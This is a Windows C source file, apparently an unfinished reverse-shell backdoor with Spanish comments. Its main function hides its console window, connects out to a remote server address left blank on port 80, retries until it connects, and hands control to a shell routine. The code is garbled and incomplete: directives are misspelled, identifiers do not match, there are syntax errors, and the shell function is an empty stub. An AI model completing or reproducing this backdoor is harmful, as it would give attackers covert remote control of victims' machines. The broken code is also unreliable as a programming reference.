#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#definde bzero(p , size)))

int sock;


void Shell{

	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1) {
		jump:
		memset
}

}



int APIENTRY WinMain(HINSTANCE hInstace, HINSTANCE hPrev , LPSTR lpCmdLine , int nCmdShow){

	HWND stealth;  //hacemos una consola
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindows(stealth ,0) //esconder ventana

	struct sockaddr_in ServAddr; //creamos socker y conectamos
	unsigned short ServPort;
	char *ServIp;
	WSADATA wsaData;

	ServIP = "";
	ServPort = 80;

	if (WSAStartup(MAKEWORD(2,0), &wsaDATA) !=0 { //wsass..primera funcion socket
		exit(1);

}

	sock = socket(AF_INET,SOCK_STREAM, 0);

	memset(&ServAdd, 0, sizeof(ServAdd));
	ServAddr.sin_family=AF_INET;
	ServAdd.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr/sin_port = htons(ServPort);

	start:
	while connect(sock, (struct  sockaddr *) &ServAddr, sizeof(ServAddr)) !=0){
		Sleep(10);
		goto start;

        } 
	Shell();

}

